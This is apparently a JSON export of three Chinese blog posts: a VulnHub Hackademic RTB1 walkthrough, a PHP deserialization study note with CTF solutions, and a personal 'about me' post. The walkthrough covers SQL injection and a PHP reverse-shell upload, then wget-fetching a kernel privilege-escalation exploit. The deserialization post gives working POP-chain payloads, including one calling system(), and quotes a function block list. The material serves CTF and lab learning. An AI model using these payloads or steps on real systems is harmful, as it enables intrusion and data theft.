[{"title":"hackademic_RTB1_writeup","url":"/2023/10/25/hackademic-RTB1-writeup/","content":"\n# hackademic RTB1_靶机名_writeup\n这是学校课程的作业，《红队/渗透 — 和我一起来打靶》也涉及了该靶机\n\n# 靶机简介\n\n> 靶机名：hackademic RTB1\n> 靶机链接：https://www.vulnhub.com/entry/hackademic-rtb1,17/\n> 描述：This is the first realistic hackademic challenge (root this box) by mr.pr0n\n\tDownload the target and get root.\n\tAfter all, try to read the contents of the file 'key.txt' in the root directory.\n\tEnjoy!\n\n\n# 攻击流程\nps:具体攻击过程请看**渗透过程及结果**\n## 信息搜集\n1. nmap扫描端口发现80端口开放，访问自动跳转目录Hackerademic_RTB1\n2. dirsearch目录遍历，发现文件夹wp-admin，进入后台登陆页面\n3. 访问网页首页，依次点击直到点击`Uncategoried`，发现参数cat，是有sql注入漏洞的\n## 拿shell\n1. sqlmap注入后，查看wordpress数据库下的wp_users，获取网站用户和密码的hash值，通过sqlmap的自带功能爆破hash值获得密码\n2. GerogeMiller用户的权限较大，登陆后的网页东西更多，可以更改网站设置选项，其中有`是否开启upload`的选项，也可以设定上传文件的允许格式，这里添加php\n3. 上传kali自带的php反弹shell脚本，目录为`/usr/share/webshells/php/php-reverse-shell.php`，修改脚本的ip和端口参数为渗透机\n4. 本地nc开启端口监听；网站上传完文件后会提示上传到了哪个目录，直接访问，和本地nc的监听端口连接，getshell\n## 提权\n1. `sudo -l`发现当前的用户不是sudoer\n2. 寻找suid可执行文件，也没有找到能用的\n3. `uname -a`查看当前靶机内核版本，`2.6.31.5-127.fc12.1686`\n4. `searchsploit 2.6.3|grep \"Local Pri\"`寻找内核漏洞提取脚本，cp到`/var/www/html`\n5. 渗透机开启apache服务，在拿到的shell上用`wget`下载内核漏洞脚本，并用靶机的gcc命令编译执行\n6. 15285.c这个脚本可以root靶机 `Linux Kernel 2.6.36-rc8 - 'RDS Protocal' Local Privilege Escalation`\n# 工具和技术\n\n> nmap\n> dirsearch\n> sqlmap\n> kali自带的反弹shell脚本和提取脚本\n> nc监听端口\n> 通过渗透机的apache网站下载脚本至靶机\n> `searchsploit`\n> 内核提取漏洞\n\n# 渗透过程及结果\n1. 信息搜集\n![](hackademic-RTB1-writeup/1.png)\n![](hackademic-RTB1-writeup/2.png)\n![](hackademic-RTB1-writeup/3.png)\n![](hackademic-RTB1-writeup/4.png)\n2. sqlmap注入\n![](hackademic-RTB1-writeup/5.png)\n![](hackademic-RTB1-writeup/6.png)\n![](hackademic-RTB1-writeup/7.png)\n![](hackademic-RTB1-writeup/8.png)\n![](hackademic-RTB1-writeup/9.png)\n3. 上传webshell\n![](hackademic-RTB1-writeup/10.png)\n![](hackademic-RTB1-writeup/11.png)\n![](hackademic-RTB1-writeup/12.png)\n![](hackademic-RTB1-writeup/13.png)\n![](hackademic-RTB1-writeup/14.png)\n![](hackademic-RTB1-writeup/15.png)\n![](hackademic-RTB1-writeup/16.png)\n4. getshell和普通的信息搜集\n![](hackademic-RTB1-writeup/17.png)\n5. 内核漏洞测试，root靶机\n![](hackademic-RTB1-writeup/18.png)\n![](hackademic-RTB1-writeup/19.png)\n![](hackademic-RTB1-writeup/20.png)\n![](hackademic-RTB1-writeup/21.png)\n# 总结反思\n\n> 首先，sqlmap确实是很好用的工具，尤其对我这种手注基础薄弱的人来说更是如此，这是我的短板\n> kali的自带脚本十分的有用，我应该多多了解一下的\n> 内核漏洞是十分基础和重要的漏洞利用方式，但是根据系统内核版本模糊地查询漏洞脚本一个一个试——太累了、太慢了、太粗糙了，摸索或学习一套快速方便的工作流因此而言是十分重要的\n> 关于内核漏洞的原理，这东西可钻研的东西可多了，但如果真的要学习这个东西：需要扎实的计算机构成原理、系统运行方式基础，这些东西我根本没有\n\n# 参考资料\n\n> 学校给的writeup","tags":["技术","writeup"],"categories":["网络安全","渗透"]},{"title":"php反序列化浅记","url":"/2023/10/25/php反序列化浅记/","content":"\n\n关键词：对象、类、成员变量、成员函数、父子类、序列化、反序列化、魔术方法、poc\n\n感谢让我领略了php反序列化风采的K3zy前辈： https://github.com/kkontheway\n\n---\n\n# 简介\n面向对象的是一种编程思想和方法\n即将数据和操作数据的方法封装成一个对象，来实现具体的功能\n也就是说对象包含了一些数据和一些函数(即方法)，可以调用对象的成员变量来进行计算，也可以调用对象的成员方法达成某一功能\n\n```\n对象这个概念十分的抽象，runoob关于对象的介绍十分的好，但是我觉得有多余的抽象，如果要方便理解这个概念，还是具象一点好，尤其是我不搞开发，不向这种东西注入“心血”\n我认为要善于灵活地运用抽象和具象来方便学习\n```\n\n类是创建对象的模版，对象的创建按照类的结构、包含类的方法(函数)\n\n## 类的创建\n```\n<?php\nclass 类名 {\n\t成员变量\n\tfunction 成员方法(形参){\n\t\t方法语句; //函数语句\n\t}\n}\n?>\n```\n## 对象的创建\n```\n<?php\n\n$变量 = new 类名(穿参);\n?>\n```\n## 对象成员的调用\n```\n<?php\n\n$对象变量->成员变量 = 1;\n$对象变量->成员函数();\n?>\n```\n## 关于对象的访问控制\n\n**public（公有）：** 公有的类成员可以在任何地方被访问。// 如果用var定义那就算public\n**protected（受保护）：** 受保护的类成员则可以被其自身以及其子类和父类访问。\n**private（私有）：** 私有的类成员则只能被其定义所在的类访问。\n\n以上关于访问控制的“类”可以和”对象“替换\n\n# 序列化和反序列化\n只需要知道两个函数和一个核心特性\n- **serialize()** 函数用于序列化对象或数组，并返回一个字符串，如果对象里有方法，则略过不管\n- **unserialize()** 函数用于将序列化后的对象或数组进行反序列化，并返回原始的对象结构(不包括方法了)\n- 核心特性就是，若一个序列化字符串包含了对象a(其结构与类A完全相同)，且发送到了一个php网页被反序列化，同时这个php网页定义了类A，那么这个反序列化后的对象能调用类A的方法了\n\n对象结构与类结构相同的意思是，对象具有相同的类名和变量名\n# 浅析序列化字符串\n```\n<?php\nclass Flag1{ \n    public $file;  \n\tpublic $apple=\"red and sweet\";\n\n}\nclass Flag02{\n\tpublic $test;\n}\n\n$a=new Flag1();\n$a->file=new Flag02();\n$a->file->test=\"I'm truthleader\";\n\necho serialize($a)\n?>\n```\n该代码打印的序列化字符串如下：\n`O:5:\"Flag1\":3:{s:4:\"file\";O:6:\"Flag02\":1:{s:4:\"test\";s:15:\"I'm truthleader\";}s:5:\"apple\";s:13:\"red and sweet\";s:6:\"banana\";N;}`\n这可以拆分为\n- O:5:\"Flag1\":2:{}\n- :4:\"file\";O:6:\"Flag02\":1:{}s:5:\"apple\";s:13:\"red and sweet\";s:6:\"banana\";N;\n- s:4:\"test\";s:15:\"I'm truthleader\";\n1. 第一段的O代表对象，5代表对象名的字符数，Flag1是对象名，2代表该对象有两个成员变量，{这里嵌套了两个成员变量}\n2. 第二段的s代表字符串(即变量的数据类型)，file是变量名，而Flag02是值名兼对象名。banana的值的类型是N。{这里的成员变量是一键值对的形式排列的}\n3. 第三段同上\n\n# 魔术方法\n具体内容看php官网 \nhttps://www.php.net/manual/zh/language.oop5.magic.php\n\n魔法方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。魔术方法与序列化和反序列化强相关\n魔术方法的名称是固定的：\n```\n__wakeup() 执行unserialize()时，先会调用这个函数\n\n__sleep() 执行serialize()时，先会调用这个函数\n\n__destruct() 对象被销毁时触发\n\n__call() 在对象上下文中调用不可访问的方法时触发\n\n__callStatic() 在静态上下文中调用不可访问的方法时触发\n\n__get() 用于从不可访问的属性读取数据或者不存在这个键都会调用此方法\n\n__set() 用于将数据写入不可访问的属性\n\n__isset() 在不可访问的属性上调用isset()或empty()触发\n\n__unset() 在不可访问的属性上使用unset()时触发\n\n__toString() 把类当作字符串使用时触发\n\n__invoke() 当尝试将对象调用为函数时触发\n```\n# POC链\n是一串专门的序列化字符串，传到php网页后解序列化，就能激活php网页中*特定对象*的魔术方法，从而执行敏感函数，例如读取flag、执行命令或代码\n\nPOC链的结构需要与特定对象一样，即有相同的类名、成员变量名，且包含类所规定的所有成员变量\n\nPOC链的构造需要对php网页代码进行审计，分析类的结构、魔术方法和成员变量间的关系，最终用本地的php脚本生成序列化字符串\n\n## POC链的工作原理\n1. 作为网页的穿参传到php网页\n2. php网页自动反序列化poc链条(前提是网页确实会反序列化该穿参)\n3. poc链条符合了魔术方法的发动条件，从而引发了一连串的魔术方法反应，最终执行敏感函数\n\n> 一般读取文件、执行命令的函数都是敏感函数\n\n## 生成poc链\n1. 编写php代码，定义类——和目标网页源代码中的类结构要一模一样，严格到大小写也一样\n2. 创建对象，更改对象的成员变量的值，以达到引动魔术方法的目的\n3. 生成序列化字符串\n\n# 反序列化例题\nctfhub上有环境，可以自己做\n## 2020-网鼎杯-朱雀组-Web-phpweb\n### 源码\n```\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n最简单的，但是有一些弯弯绕绕\n\n### 代码分析\n1. 页面接受两个POST传参：func p\n2. call_user_func($func, $p)是敏感函数，其第一个参数是php函数名，第二个参数是函数的传参，其功能就是调用并执行函数\n3. 这确实可以执行函数，但是经过了严格的过滤，当然，file_get_contents和unserialize函数是可以使用的\n4. 原题通过file_get_contents阅读代码\n5. 改网页对func进行了过滤，但是没有对p，同时有一个调用了敏感函数入口gettime的Test类，所以可以手动执行unserialize函数，并构造poc链\n\n## poc\n```\n<?php\nclass Test {\n\tvar p;\n\tvar func; //由于序列化后的对象没有了方法，所以那些多余的东西根本不用写根本不用写\n}\n$a = new Test();\n$a->p = \"pwd\";\n$a->func = \"system\";\n\necho serialize($a);\n//echo urlencode(serialize($a);\n?>\n```\n然后传参，func为unserialize，p为poc链，现在可以执行任意系统命令和代码了\n## 2020-网鼎杯-青龙组-Web-AreUSerialz\n```\n<?php\n \ninclude(\"flag.php\");\n \nhighlight_file(__FILE__);\n \nclass FileHandler {\n \n    protected $op;\n    protected $filename;\n    protected $content;\n \n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n \n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n \n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n \n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n \n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n \n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n \n}\n \nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n \nif(isset($_GET{'str'})) {\n \n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n \n}\n```\n## 代码分析\n1. 接受一个传参str，进行is_valid过滤(这个过滤的意思就只是确保str里没有32-125之外的字符，鉴于我们传的东西没有那些字符，所以可以直接略过)\n2. 反序列化`$`str，并赋值给`$`obj\n3. 类FileHandler有三个成员变量，在序列化里，protected没多大用的\n4. FileHandler在创建对象的时候会执行`__construct`，销毁对象时执行`__destruct`，两个方法都会调用process方法\n5. process方法会调用write或read方法，这两个方法里有敏感函数，一个读文件一个写文件，我们这次只需要读；然后会调用output将read的返回输出\n6. 如果要构造poc链，那里面的op要为2，filename要为我们想要读取文件的文件名，当然就是include包含的flag.php\n\n## poc\n```\n<?php\nclass FileHandler {\n    public $op;\n    public $filename;\n    public $content;\n}\n$a = new FileHandler(); // 虽然__construct方法会修改op和filename\n$a->op=2;\n$a->filename=\"flag.php\";\n\necho serialize($a);\n//echo urlencode(serialize($a);\n?>\n```\n\n## 浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维\n## 源码1\n```\n<?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        echo \"Not now!\";\n        exit(); \n    }else{\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n这里用到了伪协议的知识，这与我们这篇浅记的主题无关，况且这是浅浅一记\n只需要知道，通过data://伪协议传text绕过welcome to the zjctf，再file传php伪协议的任意文件读取读useless.php内容的base64，然后解码就能得到useless.php源代码\n## 源码2\n```\n<?php  \n\nclass Flag{  //flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}  \n?>  \n```\n这里可以真读取任意文件了，毕竟源码1过滤了file\n\n## 代码分析\n1. `__tostring`在所在对象被当作字符串时发动\n2. 敏感函数读取$file文件，然后输出\n3. 由于源码1 echo了反序列化的$password——当作字符串输出，所以这里就是突破口\n\n## poc链\n```\n<?php\nclass Flag{  \n    public $file;  \n}  \n$a = new Flag();\n$a->file=\"flag.php\";\n\necho serialize($a);\n//echo urlencode(serialize($a);\n?>\n```\n传入一下url\n```\n/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\nps:我想时常试用f12是一个好习惯\n\n## 2021-第五空间智能安全大赛-Web-pklovecloud\n## 源码\n```\n<?php  \ninclude 'flag.php';\nclass pkshow \n{  \n    function echo_name()     \n    {          \n        return \"Pk very safe^.^\";      \n    }  \n} \n\nclass acp \n{   \n    protected $cinder;  \n    public $neutron;\n    public $nova;\n    function __construct() \n    {      \n        $this->cinder = new pkshow;\n    }  \n    function __toString()      \n    {          \n        if (isset($this->cinder))  \n            return $this->cinder->echo_name();      \n    }  \n}  \n\nclass ace\n{    \n    public $filename;     \n    public $openstack;\n    public $docker; \n    function echo_name()      \n    {   \n        $this->openstack = unserialize($this->docker);\n        $this->openstack->neutron = $heat;\n        if($this->openstack->neutron === $this->openstack->nova)\n        {\n        $file = \"./{$this->filename}\";\n            if (file_get_contents($file))         \n            {              \n                return file_get_contents($file); \n            }  \n            else \n            { \n                return \"keystone lost~\"; \n            }    \n        }\n    }  \n}  \n\nif (isset($_GET['pks']))  \n{\n    $logData = unserialize($_GET['pks']);\n    echo $logData; \n} \nelse \n{ \n    highlight_file(__file__); \n}\n?>\n```\n\n## 代码分析\n1. 反序列化pks，赋值给logData，然后输出\n2. pkshow类没什么好说的\n3. acp会首先将cinder构建为pkshow对象，然后调用里面的echo_name输出，我们不想要这个\n4. ace的echo_name会反序列化成员变量docker，然后赋值给openstack\n5. 比较openstack里面的neutron和nova，看看是否值和类型都相等\n6. 相等就根据$filename读取文件\n7. 如果openstack没有neutron和nova，那么必然相等，即——虚无和虚无是等价的。毕竟$heat的值是不知道的。这意味着根本不用管docker和openstack\n\n## poc链条\n```\n<?php\nclass ace{\n    public $filename;     \n    public $openstack;\n    public $docker; \n}\nclase acp{\n    protected $cinder;  \n    public $neutron;\n    public $nova;\n}\n\n$a = new acp();\n$a->cinder=new ace();\n$a->cinder->filename=\"flag.php\";\n?>\n```\n\n# 总结\n1. 反序列化蛮好玩的，当然学的话那是真的头痛\n2. 解决反序列化题目有一下几个要点\n\t1. 得到源代码\n\t2. 魔术方法\n3. 得到源代码需要其他web渗透和ctf技能的辅助，我的基础不太牢靠，需要对一下这几个方面进行补足：\n\t1. xss\n\t2. csrf\n\t3. ssrf\n\t4. 伪协议\n\t5. 文件上传、读取、包含webshell\n\t6. SQL注入\n\t7. 其他","tags":["技术","浅记"],"categories":["网络安全","ctf"]},{"title":"hello_and_call_me_lord","url":"/2023/10/21/hello-and-call-me-lord/","content":"\n# 你好👋\n![](hello-and-call-me-lord/远视主义旗帜.jpeg)\n## 关于我的名字和这个教会\n我是truthleader，也可以叫我真理教教主\n\n我本来给自己设计的网名就是真理教教主，但是truthleader听上去更朗朗上口\n\n所以我用google翻译得到了truthleader，（很遗憾现在不是这样的翻法了）😭\n\n这是一个教会的官方网站，但是注意，这是一个私人的教会，我的意识是教会成员只有一个人，我兼任教主、圣战委员会常务委员长、自我教育局局长······\n\n总之，这个网站代表着我想要公之于众的自我内心世界，我的初心就是把我最真实的精神世界裸露出来，不论祂是否让人感到愉悦好玩、恶心厌恶————I don't care a fuck\n\n## 关于我\n我学习的专业是信息安全，我将此看作我主要的经济来源，这是我的爱好\n\n我喜欢学习：哲学的、社会学的、科学的、政治的、心理的、生物的、医学的、地理的、计算机或者安全相关的——一切都是我想学的\n\n我希望别人对我的评价是：thinker\n\n### 我的观念\n\n我将虚无主义预设为前提：\n\n1. 目的本身是没目的的\n2. 意义本身是没意义的\n3. 存在是虚无的，但其存在是一个奇迹\n4. 伦理道德是空虚之物\n5. 不能用虚无为自己消极的态度做辩护，两者根本不接轨，想自杀的人因此而无顾忌，乐观向上的人因此而无拘束的乐于助人追求进步\n6. 自杀是不对的，死亡是不对的，人的欲望不应把人摧毁，我的欲望不应把我摧毁，\n\n- 所谓的“我”是头脑生出的幻想，我所认为的那个“我”并不存在，本真的“我”是虚无的，所谓的自我意识是欲望集合体的某一个组织——调配欲望的优先满足顺序、计划欲望满足的机器\n- 我把“求知欲”认定为我，我将禁欲的欲望当作枪来压制游戏的欲望和性的欲望，一切互相制衡分出高低，我把自己看作一个欲望代言人，欲望都想当我\n- 求知欲是唯一变革自我观念、自我能力、自我的动力，我因此而行动生活，我不认为我的观念是真的、有价值的、可信的\n- 我因为学习和头脑训练得出观念，我视其为求知欲想认识自己\n\n- 我将欲望看作是第一性的，因而以此为基础来看待世界\n- 对我来说，欲望的对象是具体的人和事，但欲望的目的是自我再生产，欲望通过快感实现再生产\n- 快感是让人有愧疚感、罪恶感、兴奋感的上瘾之物\n- 欲望的停止就是世界的死去\n- 一切都是欲望的产物，包括欲望，例如：时间在前进、世界在涌现、现在带着过去奔向未来、有着“定律”的未来在把现实和过去牵引、资本为了再生产而支取肉身、变革者为了福祉、平等、幸福、理想而不断的前进、福祉本身的标准越来越高、科学越来越复杂强大、抖音越刷越想刷、游戏越玩越想玩\n\n- 人不应该在欲望上让步，要不顾一切的让自己的欲望不断的再生产——保持生存、避免危险、享用美食、求取知识、爱另一半、尊老爱幼、尊敬师长、服从规矩\n- 但欲望之间是互相冲突的，例如：想吃饭同时又想五谷轮回，总要先五谷轮回才能吃好饭，你是否想在五谷轮回的时候吃饭呢？有了一门赚钱的方式，但这触碰了良心，只有先检查良心去伪存真，然后才知道到底要不要这么做？\n\n- 我只捍卫自己的欲望，别人怎么样与我无关，除非有欲望的牵扯，除非长远来看我真的确实就应该服软\n- 罪犯有犯罪的能力，共同体的代表有抓捕的权利和义务\n\n\n\n# 关于这个网站和未来的展望\n## 我必须承认，我什么都没准备好：\n\n1. 我没有关于这个网站的一个准确的定位，我不知道这个博客到底有什么价值——能让我使用时间去构筑和维护\n2. 我没有设计这个网站的标签系统和分类系统，我想在博文的数量多一点之后再分类和贴标签\n3. 我认为这个网站的美术和外观都是一坨💩，这个网站堪堪一用就被我上传上来了（说不定以后会改善，我可能会钻研css和js，我也可能会在github上找我喜欢的代码用到这里来）\n\n## 同时我也要对自己争辩，这个网站还是很不错的：\n\n1. 我能通过这个来展示自己的能力，以后甚至可以写简介里\n2. 我可以通过这个网站来吸引一些同好来交流，我将因此而得到提升\n3. 我将通过对这个网站灌注心血来反向提升自我\n\n## 然后，你可能会好奇，我会写些什么：\n\n1. CTF题目的writeup\n2. 靶机的writeup\n3. 漏洞的技术文档或学习笔记\n4. 对安全事件的技术性反思\n5. 对我的观念的阐述\n6. 网安甚至其他内容的学习笔记\n7. 读书笔记\n\n## 我希望这个网站：\n\n1. 能越来越有名气\n2. 外观和美术越来越好看\n3. 每个人能从中获益，从而找到好友\n4. 能给我的就业和真实生活带了进步\n5. 有一个完善的标签和分类体系","tags":["me"],"categories":["About"]}]